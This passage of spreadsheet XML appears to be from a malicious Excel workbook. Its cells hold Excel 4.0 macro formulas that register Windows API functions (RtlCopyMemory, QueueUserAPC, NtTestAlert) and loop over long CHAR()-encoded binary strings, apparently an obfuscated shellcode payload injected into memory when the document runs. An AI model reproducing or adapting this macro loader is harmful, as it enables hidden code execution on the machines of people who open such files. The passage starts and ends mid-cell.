AR(249)&amp;CHAR(98)&amp;CHAR(238)&amp;CHAR(28)&amp;CHAR(97)&amp;CHAR(70)&amp;CHAR(190)&amp;CHAR(154)&amp;CHAR(206)&amp;CHAR(139)&amp;CHAR(228)&amp;CHAR(177)&amp;CHAR(86)&amp;CHAR(125)&amp;CHAR(123)&amp;CHAR(174)&amp;CHAR(5)&amp;CHAR(169)&amp;CHAR(221)&amp;CHAR(66)&amp;CHAR(13)&amp;CHAR(51)&amp;CHAR(146)&amp;CHAR(68)&amp;CHAR(228)&amp;CHAR(133)&amp;CHAR(165)&amp;CHAR(112)&amp;CHAR(132)&amp;CHAR(252)&amp;CHAR(238)&amp;CHAR(114)&amp;CHAR(52)&amp;CHAR(251)&amp;CHAR(228)</f>
        <v>=_x000F_©_x0008_¡Ÿß_x0010_b/³´ý(AvzJ®,Á YX_x0003_C•1í_x0007_Y9Ú¦7eZJŸ &lt;_¨¶!ÓÉôßûGR©R¸VÑ/\&amp;´z_x000D__x0008__x0002_†_x001E_PŽö@;WµÖŒ€~_x001F_6¨`«,o'ô:@†Uý#Ú_x0013_„)eg¼ÕËxSÚ_x0001_ª_x001D_}ÌL¤76²vÈææ_x001F_š_x0001_#,©G×‹•VËêT'|
_x0008_ýyl¬¿_x0016_q—Y\`_x0008_SeœÊÊÑ_x0014_×#·è„¹_x0016_B˜;´=œå y_x0001_£ÿK_x001F_ÛÊÍs(Óçg¾™»Ü}‘qª`aµ_x000E_ÚìÂ³‡p¤³u{h_x0004_S[Pùbî_x001C_aF¾šÎ‹ä±V}{®_x0005_©ÝB_x000D_3’Dä…¥p„üîr4ûä</v>
      </c>
      <c r="C25" t="str">
        <f>CHAR(248)&amp;CHAR(153)&amp;CHAR(159)&amp;CHAR(65)&amp;CHAR(209)&amp;CHAR(237)&amp;CHAR(118)&amp;CHAR(218)&amp;CHAR(171)&amp;CHAR(183)</f>
        <v>ø™ŸAÑívÚ«·</v>
      </c>
    </row>
    <row r="26" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A26" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B26" t="str">
        <f>CHAR(186)&amp;CHAR(43)&amp;CHAR(133)&amp;CHAR(178)&amp;CHAR(60)&amp;CHAR(54)&amp;CHAR(148)&amp;CHAR(151)&amp;CHAR(200)&amp;CHAR(30)&amp;CHAR(240)&amp;CHAR(23)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(126)&amp;CHAR(122)&amp;CHAR(88)&amp;CHAR(150)&amp;CHAR(213)&amp;CHAR(118)&amp;CHAR(211)&amp;CHAR(78)&amp;CHAR(176)&amp;CHAR(83)&amp;CHAR(206)&amp;CHAR(235)&amp;CHAR(132)&amp;CHAR(63)&amp;CHAR(84)&amp;CHAR(103)&amp;CHAR(18)&amp;CHAR(115)&amp;CHAR(152)&amp;CHAR(171)&amp;CHAR(108)&amp;CHAR(133)&amp;CHAR(247)&amp;CHAR(227)&amp;CHAR(11)&amp;CHAR(174)&amp;CHAR(228)&amp;CHAR(100)&amp;CHAR(49)&amp;CHAR(251)&amp;CHAR(252)&amp;CHAR(137)&amp;CHAR(114)&amp;CHAR(28)&amp;CHAR(137)&amp;CHAR(108)&amp;CHAR(10)&amp;CHAR(117)&amp;CHAR(252)&amp;CHAR(37)&amp;CHAR(191)&amp;CHAR(122)&amp;CHAR(217)&amp;CHAR(100)&amp;CHAR(100)&amp;CHAR(94)&amp;CHAR(224)&amp;CHAR(149)&amp;CHAR(218)&amp;CHAR(224)&amp;CHAR(190)&amp;CHAR(207)&amp;CHAR(198)&amp;CHAR(1)&amp;CHAR(167)&amp;CHAR(40)&amp;CHAR(55)&amp;CHAR(228)&amp;CHAR(106)&amp;CHAR(168)&amp;CHAR(165)&amp;CHAR(125)&amp;CHAR(180)&amp;CHAR(42)&amp;CHAR(18)&amp;CHAR(191)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(204)&amp;CHAR(174)&amp;CHAR(137)&amp;CHAR(36)&amp;CHAR(12)&amp;CHAR(146)&amp;CHAR(119)&amp;CHAR(58)&amp;CHAR(193)&amp;CHAR(218)&amp;CHAR(16)&amp;CHAR(26)&amp;CHAR(107)&amp;CHAR(81)&amp;CHAR(64)&amp;CHAR(198)&amp;CHAR(223)&amp;CHAR(160)&amp;CHAR(191)&amp;CHAR(54)&amp;CHAR(160)&amp;CHAR(48)&amp;CHAR(227)&amp;CHAR(14)&amp;CHAR(13)&amp;CHAR(152)&amp;CHAR(9)&amp;CHAR(39)&amp;CHAR(86)&amp;CHAR(206)&amp;CHAR(111)&amp;CHAR(68)&amp;CHAR(41)&amp;CHAR(167)&amp;CHAR(121)&amp;CHAR(106)&amp;CHAR(49)&amp;CHAR(178)&amp;CHAR(32)&amp;CHAR(249)&amp;CHAR(63)&amp;CHAR(228)&amp;CHAR(190)&amp;CHAR(28)&amp;CHAR(50)&amp;CHAR(116)&amp;CHAR(231)&amp;CHAR(192)&amp;CHAR(199)&amp;CHAR(242)&amp;CHAR(222)&amp;CHAR(70)&amp;CHAR(103)&amp;CHAR(253)&amp;CHAR(108)&amp;CHAR(253)&amp;CHAR(248)&amp;CHAR(120)&amp;CHAR(31)&amp;CHAR(160)&amp;CHAR(235)&amp;CHAR(175)&amp;CHAR(239)&amp;CHAR(57)&amp;CHAR(135)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(35)&amp;CHAR(221)&amp;CHAR(229)&amp;CHAR(236)&amp;CHAR(210)&amp;CHAR(9)&amp;CHAR(153)&amp;CHAR(209)&amp;CHAR(174)&amp;CHAR(28)&amp;CHAR(231)&amp;CHAR(6)&amp;CHAR(248)&amp;CHAR(250)&amp;CHAR(201)&amp;CHAR(77)&amp;CHAR(73)&amp;CHAR(185)&amp;CHAR(132)&amp;CHAR(192)&amp;CHAR(192)&amp;CHAR(232)&amp;CHAR(83)&amp;CHAR(69)&amp;CHAR(119)&amp;CHAR(154)&amp;CHAR(69)&amp;CHAR(161)&amp;CHAR(69)&amp;CHAR(217)&amp;CHAR(60)&amp;CHAR(91)&amp;CHAR(23)&amp;CHAR(64)&amp;CHAR(78)&amp;CHAR(37)&amp;CHAR(144)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(180)&amp;CHAR(212)&amp;CHAR(127)&amp;CHAR(83)&amp;CHAR(254)&amp;CHAR(64)&amp;CHAR(23)&amp;CHAR(33)&amp;CHAR(219)&amp;CHAR(81)&amp;CHAR(146)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(255)&amp;CHAR(38)&amp;CHAR(170)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(124)&amp;CHAR(228)&amp;CHAR(138)&amp;CHAR(93)&amp;CHAR(140)&amp;CHAR(126)&amp;CHAR(90)&amp;CHAR(28)&amp;CHAR(222)&amp;CHAR(250)&amp;CHAR(18)&amp;CHAR(146)&amp;CHAR(135)&amp;CHAR(43)&amp;CHAR(115)&amp;CHAR(224)&amp;CHAR(236)&amp;CHAR(244)&amp;CHAR(49)&amp;CHAR(86)&amp;CHAR(17)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(43)&amp;CHAR(195)&amp;CHAR(232)&amp;CHAR(195)&amp;CHAR(220)&amp;CHAR(56)&amp;CHAR(56)&amp;CHAR(128)&amp;CHAR(71)&amp;CHAR(58)&amp;CHAR(91)&amp;CHAR(9)&amp;CHAR(236)&amp;CHAR(233)&amp;CHAR(66)&amp;CHAR(98)&amp;CHAR(70)&amp;CHAR(218)&amp;CHAR(214)&amp;CHAR(57)&amp;CHAR(132)&amp;CHAR(141)&amp;CHAR(188)&amp;CHAR(170)&amp;CHAR(194)&amp;CHAR(141)</f>
        <v>º+…²&lt;6”—È_x001E_ð_x0017__x000D__x0001_~zX–ÕvÓN°SÎë„?Tg_x0012_s˜«l…÷ã_x000B_®äd1ûü‰r_x001C_‰l
uü%¿zÙdd^à•Úà¾ÏÆ_x0001_§(7äj¨¥}´*_x0012_¿ªTÌ®‰$_x000C_’w:ÁÚ_x0010__x001A_kQ@Æß ¿6 0ã_x000E__x000D_˜	'VÎoD)§yj1² ù?ä¾_x001C_2tçÀÇòÞFgýlýøx_x001F_ ë¯ï9‡‹_x0002_#ÝåìÒ	™Ñ®_x001C_ç_x0006_øúÉMI¹„ÀÀèSEwšE¡EÙ&lt;[_x0017_@N%_x0007_Ž´ÔSþ@_x0017_!ÛQ’‚Fÿ&amp;ªŽÃ|äŠ]Œ~Z_x001C_Þú_x0012_’‡+sàìô1V_x0011_!_x001E_+ÃèÃÜ88€G:[	ìéBbFÚÖ9„¼ªÂ</v>
      </c>
      <c r="C26" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(40)&amp;CHAR(246)&amp;CHAR(78)&amp;CHAR(56)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(32)</f>
        <v xml:space="preserve">ÖÈi(öN8±Ö </v>
      </c>
    </row>
    <row r="27" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A27" t="b">
        <f>REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B27" t="str">
        <f>CHAR(83)&amp;CHAR(119)&amp;CHAR(134)&amp;CHAR(114)&amp;CHAR(157)&amp;CHAR(45)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(125)&amp;CHAR(164)&amp;CHAR(172)&amp;CHAR(216)&amp;CHAR(191)&amp;CHAR(202)&amp;CHAR(72)&amp;CHAR(196)&amp;CHAR(109)&amp;CHAR(178)&amp;CHAR(108)&amp;CHAR(214)&amp;CHAR(57)&amp;CHAR(210)&amp;CHAR(243)&amp;CHAR(90)&amp;CHAR(11)&amp;CHAR(12)&amp;CHAR(251)&amp;CHAR(115)&amp;CHAR(70)&amp;CHAR(164)&amp;CHAR(186)&amp;CHAR(248)&amp;CHAR(204)&amp;CHAR(49)&amp;CHAR(181)&amp;CHAR(181)&amp;CHAR(60)&amp;CHAR(127)&amp;CHAR(163)&amp;CHAR(93)&amp;CHAR(236)&amp;CHAR(255)&amp;CHAR(225)&amp;CHAR(53)&amp;CHAR(226)&amp;CHAR(124)&amp;CHAR(35)&amp;CHAR(5)&amp;CHAR(229)&amp;CHAR(20)&amp;CHAR(6)&amp;CHAR(144)&amp;CHAR(233)&amp;CHAR(27)&amp;CHAR(182)&amp;CHAR(195)&amp;CHAR(88)&amp;CHAR(123)&amp;CHAR(207)&amp;CHAR(248)&amp;CHAR(163)&amp;CHAR(164)&amp;CHAR(1)&amp;CHAR(231)&amp;CHAR(241)&amp;CHAR(42)&amp;CHAR(172)&amp;CHAR(240)&amp;CHAR(239)&amp;CHAR(18)&amp;CHAR(29)&amp;CHAR(59)&amp;CHAR(248)&amp;CHAR(118)&amp;CHAR(158)&amp;CHAR(241)&amp;CHAR(84)&amp;CHAR(157)&amp;CHAR(156)&amp;CHAR(243)&amp;CHAR(35)&amp;CHAR(129)&amp;CHAR(143)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(188)&amp;CHAR(25)&amp;CHAR(250)&amp;CHAR(209)&amp;CHAR(187)&amp;CHAR(95)&amp;CHAR(109)&amp;CHAR(59)&amp;CHAR(141)&amp;CHAR(57)&amp;CHAR(125)&amp;CHAR(247)&amp;CHAR(178)&amp;CHAR(59)&amp;CHAR(105)&amp;CHAR(233)&amp;CHAR(15)&amp;CHAR(27)&amp;CHAR(61)&amp;CHAR(7)&amp;CHAR(19)&amp;CHAR(61)&amp;CHAR(59)&amp;CHAR(11)&amp;CHAR(53)&amp;CHAR(236)&amp;CHAR(36)&amp;CHAR(146)&amp;CHAR(57)&amp;CHAR(53)&amp;CHAR(213)&amp;CHAR(91)&amp;CHAR(115)&amp;CHAR(77)&amp;CHAR(103)&amp;CHAR(157)&amp;CHAR(93)&amp;CHAR(1)&amp;CHAR(38)&amp;CHAR(94)&amp;CHAR(145)&amp;CHAR(37)&amp;CHAR(217)&amp;CHAR(82)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(139)&amp;CHAR(39)&amp;CHAR(88)&amp;CHAR(126)&amp;CHAR(40)&amp;CHAR(31)&amp;CHAR(233)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(236)&amp;CHAR(148)&amp;CHAR(118)&amp;CHAR(142)&amp;CHAR(117)&amp;CHAR(237)&amp;CHAR(11)&amp;CHAR(95)&amp;CHAR(152)&amp;CHAR(74)&amp;CHAR(210)&amp;CHAR(118)&amp;CHAR(215)&amp;CHAR(71)&amp;CHAR(87)&amp;CHAR(180)&amp;CHAR(136)&amp;CHAR(246)&amp;CHAR(156)&amp;CHAR(207)&amp;CHAR(108)&amp;CHAR(48)&amp;CHAR(216)&amp;CHAR(196)&amp;CHAR(247)&amp;CHAR(25)&amp;CHAR(193)&amp;CHAR(89)&amp;CHAR(39)&amp;CHAR(98)&amp;CHAR(129)&amp;CHAR(64)&amp;CHAR(56)&amp;CHAR(104)&amp;CHAR(75)&amp;CHAR(184)&amp;CHAR(40)&amp;CHAR(95)&amp;CHAR(27)&amp;CHAR(65)&amp;CHAR(105)&amp;CHAR(165)&amp;CHAR(77)&amp;CHAR(210)&amp;CHAR(121)&amp;CHAR(131)&amp;CHAR(81)&amp;CHAR(53)&amp;CHAR(171)&amp;CHAR(76)&amp;CHAR(125)&amp;CHAR(146)&amp;CHAR(61)&amp;CHAR(106)&amp;CHAR(167)&amp;CHAR(216)&amp;CHAR(98)&amp;CHAR(155)&amp;CHAR(27)&amp;CHAR(150)&amp;CHAR(125)&amp;CHAR(203)&amp;CHAR(131)&amp;CHAR(175)&amp;CHAR(170)&amp;CHAR(67)&amp;CHAR(233)&amp;CHAR(26)&amp;CHAR(183)&amp;CHAR(44)&amp;CHAR(49)&amp;CHAR(226)&amp;CHAR(37)&amp;CHAR(207)&amp;CHAR(200)&amp;CHAR(49)&amp;CHAR(116)&amp;CHAR(41)&amp;CHAR(9)&amp;CHAR(108)&amp;CHAR(203)&amp;CHAR(166)&amp;CHAR(232)&amp;CHAR(16)&amp;CHAR(226)&amp;CHAR(234)&amp;CHAR(109)&amp;CHAR(158)&amp;CHAR(202)&amp;CHAR(163)&amp;CHAR(255)&amp;CHAR(240)&amp;CHAR(91)&amp;CHAR(252)&amp;CHAR(211)&amp;CHAR(169)&amp;CHAR(167)&amp;CHAR(35)&amp;CHAR(249)&amp;CHAR(244)&amp;CHAR(251)&amp;CHAR(150)&amp;CHAR(190)&amp;CHAR(8)&amp;CHAR(18)&amp;CHAR(85)&amp;CHAR(67)&amp;CHAR(162)&amp;CHAR(95)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(38)&amp;CHAR(56)&amp;CHAR(14)&amp;CHAR(116)</f>
        <v>Sw†r-ˆE}¤¬Ø¿ÊHÄm²lÖ9ÒóZ_x000B__x000C_ûsF¤ºøÌ1µµ&lt;£]ìÿá5â|#_x0005_å_x0014__x0006_é_x001B_¶ÃX{Ïø£¤_x0001_çñ*¬ðï_x0012__x001D_;øvžñTœó#õ{¼_x0019_úÑ»_m;9}÷²;ié_x000F__x001B_=_x0007__x0013_=;_x000B_5ì$’95Õ[sMg]_x0001_&amp;^‘%ÙR†µ‹'X~(_x001F_é&amp;_x001E_ì”vŽuí_x000B__˜JÒv×GW´ˆöœÏl0ØÄ÷_x0019_ÁY'b@8hK¸(__x001B_Ai¥MÒyƒQ5«L}’=j§Øb›_x001B_–}Ëƒ¯ªCé_x001A_·,1â%ÏÈ1t)	lË¦è_x0010_âêmžÊ£ÿð[üÓ©§#ùôû–¾_x0008__x0012_UC¢__x0007__x0005_&amp;8_x000E_t</v>
      </c>
      <c r="C27" t="str">
        <f>CHAR(31)&amp;CHAR(161)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(91)&amp;CHAR(249)&amp;CHAR(93)&amp;CHAR(252)&amp;CHAR(4)&amp;CHAR(141)</f>
        <v>_x001F_¡ûÏ[ù]ü_x0004_</v>
      </c>
    </row>
    <row r="28" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A28" t="b">
        <f>REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B28" t="str">
        <f>CHAR(243)&amp;CHAR(225)&amp;CHAR(169)&amp;CHAR(41)&amp;CHAR(21)&amp;CHAR(50)&amp;CHAR(201)&amp;CHAR(70)&amp;CHAR(178)&amp;CHAR(169)&amp;CHAR(41)&amp;CHAR(102)&amp;CHAR(156)&amp;CHAR(84)&amp;CHAR(190)&amp;CHAR(234)&amp;CHAR(76)&amp;CHAR(101)&amp;CHAR(122)&amp;CHAR(254)&amp;CHAR(234)&amp;CHAR(235)&amp;CHAR(225)&amp;CHAR(80)&amp;CHAR(64)&amp;CHAR(224)&amp;CHAR(8)&amp;CHAR(95)&amp;CHAR(83)&amp;CHAR(224)&amp;CHAR(223)&amp;CHAR(33)&amp;CHAR(50)&amp;CHAR(7)&amp;CHAR(248)&amp;CHAR(162)&amp;CHAR(221)&amp;CHAR(233)&amp;CHAR(111)&amp;CHAR(31)&amp;CHAR(220)&amp;CHAR(243)&amp;CHAR(29)&amp;CHAR(114)&amp;CHAR(4)&amp;CHAR(247)&amp;CHAR(66)&amp;CHAR(115)&amp;CHAR(195)&amp;CHAR(210)&amp;CHAR(135)&amp;CHAR(57)&amp;CHAR(213)&amp;CHAR(131)&amp;CHAR(143)&amp;CHAR(155)&amp;CHAR(202)&amp;CHAR(213)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(246)&amp;CHAR(29)&amp;CHAR(249)&amp;CHAR(92)&amp;CHAR(89)&amp;CHAR(44)&amp;CHAR(184)&amp;CHAR(52)&amp;CHAR(26)&amp;CHAR(118)&amp;CHAR(98)&amp;CHAR(33)&amp;CHAR(234)&amp;CHAR(16)&amp;CHAR(167)&amp;CHAR(215)&amp;CHAR(190)&amp;CHAR(177)&amp;CHAR(103)&amp;CHAR(214)&amp;CHAR(169)&amp;CHAR(202)&amp;CHAR(228)&amp;CHAR(97)&amp;CHAR(199)&amp;CHAR(196)&amp;CHAR(33)&amp;CHAR(54)&amp;CHAR(164)&amp;CHAR(195)&amp;CHAR(112)&amp;CHAR(247)&amp;CHAR(8)&amp;CHAR(77)&amp;CHAR(56)&amp;CHAR(95)&amp;CHAR(243)&amp;CHAR(56)&amp;CHAR(187)&amp;CHAR(24)&amp;CHAR(180)&amp;CHAR(96)&amp;CHAR(232)&amp;CHAR(203)&amp;CHAR(248)&amp;CHAR(137)&amp;CHAR(200)&amp;CHAR(196)&amp;CHAR(111)&amp;CHAR(137)&amp;CHAR(61)&amp;CHAR(221)&amp;CHAR(80)&amp;CHAR(77)&amp;CHAR(114)&amp;CHAR(70)&amp;CHAR(186)&amp;CHAR(64)&amp;CHAR(192)&amp;CHAR(206)&amp;CHAR(181)&amp;CHAR(192)&amp;CHAR(9)&amp;CHAR(96)&amp;CHAR(30)&amp;CHAR(16)&amp;CHAR(55)&amp;CHAR(152)&amp;CHAR(122)&amp;CHAR(70)&amp;CHAR(149)&amp;CHAR(30)&amp;CHAR(146)&amp;CHAR(128)&amp;CHAR(113)&amp;CHAR(34)&amp;CHAR(72)&amp;CHAR(125)&amp;CHAR(175)&amp;CHAR(204)&amp;CHAR(240)&amp;CHAR(254)&amp;CHAR(9)&amp;CHAR(46)&amp;CHAR(26)&amp;CHAR(235)&amp;CHAR(138)&amp;CHAR(111)&amp;CHAR(102)&amp;CHAR(232)&amp;CHAR(199)&amp;CHAR(78)&amp;CHAR(236)&amp;CHAR(160)&amp;CHAR(75)&amp;CHAR(12)&amp;CHAR(41)&amp;CHAR(97)&amp;CHAR(217)&amp;CHAR(194)&amp;CHAR(89)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(135)&amp;CHAR(100)&amp;CHAR(86)&amp;CHAR(12)&amp;CHAR(93)&amp;CHAR(201)&amp;CHAR(119)&amp;CHAR(127)&amp;CHAR(231)&amp;CHAR(222)&amp;CHAR(187)&amp;CHAR(30)&amp;CHAR(120)&amp;CHAR(174)&amp;CHAR(131)&amp;CHAR(138)&amp;CHAR(128)&amp;CHAR(144)&amp;CHAR(87)&amp;CHAR(124)&amp;CHAR(107)&amp;CHAR(161)&amp;CHAR(37)&amp;CHAR(165)&amp;CHAR(250)&amp;CHAR(6)&amp;CHAR(235)&amp;CHAR(114)&amp;CHAR(81)&amp;CHAR(235)&amp;CHAR(31)&amp;CHAR(176)&amp;CHAR(177)&amp;CHAR(61)&amp;CHAR(70)&amp;CHAR(142)&amp;CHAR(238)&amp;CHAR(17)&amp;CHAR(80)&amp;CHAR(39)&amp;CHAR(142)&amp;CHAR(168)&amp;CHAR(100)&amp;CHAR(109)&amp;CHAR(150)&amp;CHAR(23)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(117)&amp;CHAR(222)&amp;CHAR(45)&amp;CHAR(70)&amp;CHAR(213)&amp;CHAR(9)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(231)&amp;CHAR(51)&amp;CHAR(77)&amp;CHAR(188)&amp;CHAR(195)&amp;CHAR(99)&amp;CHAR(89)&amp;CHAR(29)&amp;CHAR(76)&amp;CHAR(237)&amp;CHAR(153)&amp;CHAR(70)&amp;CHAR(198)&amp;CHAR(213)&amp;CHAR(248)&amp;CHAR(15)&amp;CHAR(252)&amp;CHAR(25)&amp;CHAR(10)&amp;CHAR(15)&amp;CHAR(173)&amp;CHAR(101)&amp;CHAR(226)&amp;CHAR(255)&amp;CHAR(154)&amp;CHAR(46)&amp;CHAR(62)&amp;CHAR(101)&amp;CHAR(171)&amp;CHAR(165)&amp;CHAR(58)&amp;CHAR(1)&amp;CHAR(248)&amp;CHAR(48)&amp;CHAR(238)&amp;CHAR(34)</f>
        <v>óá©)_x0015_2ÉF²©)fœT¾êLezþêëáP@à_x0008__Sàß!2_x0007_ø¢Ýéo_x001F_Üó_x001D_r_x0004_÷BsÃÒ‡9Õƒ›ÊÕ_x0006_Ëö_x001D_ù\Y,¸4_x001A_vb!ê_x0010_§×¾±gÖ©ÊäaÇÄ!6¤Ãp÷_x0008_M8_ó8»_x0018_´`èËø‰ÈÄo‰=ÝPMrFº@ÀÎµÀ	`_x001E__x0010_7˜zF•_x001E_’€q"H}¯Ìðþ	._x001A_ëŠofèÇNì K_x000C_)aÙÂY_x000C_Œ‡dV_x000C_]ÉwçÞ»_x001E_x®ƒŠ€W|k¡%¥ú_x0006_ërQë_x001F_°±=FŽî_x0011_P'Ž¨dm–_x0017_Ì_x0004_uÞ-FÕ	QVç3M¼ÃcY_x001D_Lí™FÆÕø_x000F_ü_x0019_
_x000F_­eâÿš.&gt;e«¥:_x0001_ø0î"</v>
      </c>
      <c r="C28" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(249)&amp;CHAR(85)&amp;CHAR(14)&amp;CHAR(17)&amp;CHAR(236)&amp;CHAR(114)&amp;CHAR(63)</f>
        <v>ûÏ&gt;ùU_x000E__x0011_ìr?</v>
      </c>
    </row>
    <row r="29" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A29" t="b">
        <f>REGISTER("ntdll","NtTestAlert","J","Go",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B29" t="str">
        <f>CHAR(195)&amp;CHAR(99)&amp;CHAR(45)&amp;CHAR(77)&amp;CHAR(135)&amp;CHAR(209)&amp;CHAR(108)&amp;CHAR(240)&amp;CHAR(17)&amp;CHAR(103)&amp;CHAR(230)&amp;CHAR(228)&amp;CHAR(208)&amp;CHAR(241)&amp;CHAR(255)&amp;CHAR(108)&amp;CHAR(219)&amp;CHAR(241)&amp;CHAR(86)&amp;CHAR(226)&amp;CHAR(155)&amp;CHAR(243)&amp;CHAR(110)&amp;CHAR(228)&amp;CHAR(28)&amp;CHAR(3)&amp;CHAR(171)&amp;CHAR(113)&amp;CHAR(134)&amp;CHAR(131)&amp;CHAR(183)&amp;CHAR(12)&amp;CHAR(118)&amp;CHAR(195)&amp;CHAR(99)&amp;CHAR(168)&amp;CHAR(235)&amp;CHAR(31)&amp;CHAR(172)&amp;CHAR(141)&amp;CHAR(15)&amp;CHAR(250)&amp;CHAR(75)&amp;CHAR(70)&amp;CHAR(243)&amp;CHAR(222)&amp;CHAR(7)&amp;CHAR(199)&amp;CHAR(230)&amp;CHAR(17)&amp;CHAR(60)&amp;CHAR(204)&amp;CHAR(117)&amp;CHAR(237)&amp;CHAR(37)&amp;CHAR(161)&amp;CHAR(47)&amp;CHAR(93)&amp;CHAR(164)&amp;CHAR(3)&amp;CHAR(177)&amp;CHAR(120)&amp;CHAR(199)&amp;CHAR(50)&amp;CHAR(26)&amp;CHAR(197)&amp;CHAR(208)&amp;CHAR(56)&amp;CHAR(187)&amp;CHAR(52)&amp;CHAR(175)&amp;CHAR(19)&amp;CHAR(170)&amp;CHAR(117)&amp;CHAR(116)&amp;CHAR(164)&amp;CHAR(100)&amp;CHAR(189)&amp;CHAR(17)&amp;CHAR(87)&amp;CHAR(77)&amp;CHAR(14)&amp;CHAR(77)&amp;CHAR(204)&amp;CHAR(37)&amp;CHAR(239)&amp;CHAR(89)&amp;CHAR(157)&amp;CHAR(8)&amp;CHAR(238)&amp;CHAR(179)&amp;CHAR(163)&amp;CHAR(167)&amp;CHAR(77)&amp;CHAR(191)&amp;CHAR(176)&amp;CHAR(175)&amp;CHAR(137)&amp;CHAR(70)&amp;CHAR(53)&amp;CHAR(159)&amp;CHAR(240)&amp;CHAR(47)&amp;CHAR(206)&amp;CHAR(194)&amp;CHAR(207)&amp;CHAR(160)&amp;CHAR(32)&amp;CHAR(233)&amp;CHAR(119)&amp;CHAR(45)&amp;CHAR(35)&amp;CHAR(221)&amp;CHAR(33)&amp;CHAR(195)&amp;CHAR(126)&amp;CHAR(241)&amp;CHAR(155)&amp;CHAR(217)&amp;CHAR(185)&amp;CHAR(156)&amp;CHAR(26)&amp;CHAR(33)&amp;CHAR(130)&amp;CHAR(32)&amp;CHAR(79)&amp;CHAR(206)&amp;CHAR(181)&amp;CHAR(27)&amp;CHAR(203)&amp;CHAR(184)&amp;CHAR(13)&amp;CHAR(192)&amp;CHAR(98)&amp;CHAR(72)&amp;CHAR(225)&amp;CHAR(224)&amp;CHAR(109)&amp;CHAR(87)&amp;CHAR(184)&amp;CHAR(1)&amp;CHAR(95)&amp;CHAR(164)&amp;CHAR(57)&amp;CHAR(100)&amp;CHAR(95)&amp;CHAR(31)&amp;CHAR(65)&amp;CHAR(16)&amp;CHAR(178)&amp;CHAR(55)&amp;CHAR(190)&amp;CHAR(18)&amp;CHAR(210)&amp;CHAR(252)&amp;CHAR(121)&amp;CHAR(160)&amp;CHAR(56)&amp;CHAR(1)&amp;CHAR(104)&amp;CHAR(25)&amp;CHAR(58)&amp;CHAR(169)&amp;CHAR(150)&amp;CHAR(18)&amp;CHAR(157)&amp;CHAR(100)&amp;CHAR(155)&amp;CHAR(36)&amp;CHAR(187)&amp;CHAR(224)&amp;CHAR(41)&amp;CHAR(229)&amp;CHAR(35)&amp;CHAR(91)&amp;CHAR(227)&amp;CHAR(170)&amp;CHAR(138)&amp;CHAR(138)&amp;CHAR(225)&amp;CHAR(11)&amp;CHAR(179)&amp;CHAR(224)&amp;CHAR(132)&amp;CHAR(110)&amp;CHAR(2)&amp;CHAR(164)&amp;CHAR(80)&amp;CHAR(145)&amp;CHAR(147)&amp;CHAR(11)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(90)&amp;CHAR(208)&amp;CHAR(175)&amp;CHAR(177)&amp;CHAR(84)&amp;CHAR(41)&amp;CHAR(229)&amp;CHAR(240)&amp;CHAR(213)&amp;CHAR(29)&amp;CHAR(240)&amp;CHAR(4)&amp;CHAR(62)&amp;CHAR(185)&amp;CHAR(225)&amp;CHAR(215)&amp;CHAR(182)&amp;CHAR(200)&amp;CHAR(46)&amp;CHAR(138)&amp;CHAR(191)&amp;CHAR(233)&amp;CHAR(167)&amp;CHAR(203)&amp;CHAR(112)&amp;CHAR(182)&amp;CHAR(111)&amp;CHAR(240)&amp;CHAR(251)&amp;CHAR(128)&amp;CHAR(10)&amp;CHAR(63)&amp;CHAR(68)&amp;CHAR(44)&amp;CHAR(56)&amp;CHAR(175)&amp;CHAR(220)&amp;CHAR(129)&amp;CHAR(156)&amp;CHAR(69)&amp;CHAR(226)&amp;CHAR(111)&amp;CHAR(246)&amp;CHAR(161)&amp;CHAR(107)&amp;CHAR(207)&amp;CHAR(70)&amp;CHAR(180)&amp;CHAR(162)&amp;CHAR(198)&amp;CHAR(81)&amp;CHAR(27)&amp;CHAR(128)&amp;CHAR(2)&amp;CHAR(94)&amp;CHAR(227)&amp;CHAR(187)&amp;CHAR(46)&amp;CHAR(127)&amp;CHAR(198)&amp;CHAR(117)&amp;CHAR(11)</f>
        <v>Ãc-M‡Ñlð_x0011_gæäÐñÿlÛñVâ›ónä_x001C__x0003_«q†ƒ·_x000C_vÃc¨ë_x001F_¬_x000F_úKFóÞ_x0007_Çæ_x0011_&lt;Ìuí%¡/]¤_x0003_±xÇ2_x001A_ÅÐ8»4¯_x0013_ªut¤d½_x0011_WM_x000E_MÌ%ïY_x0008_î³£§M¿°¯‰F5Ÿð/ÎÂÏ  éw-#Ý!Ã~ñ›Ù¹œ_x001A_!‚ OÎµ_x001B_Ë¸_x000D_ÀbHáàmW¸_x0001__¤9d__x001F_A_x0010_²7¾_x0012_Òüy 8_x0001_h_x0019_:©–_x0012_d›$»à)å#[ãªŠŠá_x000B_³à„n_x0002_¤P‘“_x000B__x001D_†ZÐ¯±T)åðÕ_x001D_ð_x0004_&gt;¹á×¶È.Š¿é§Ëp¶oðû€
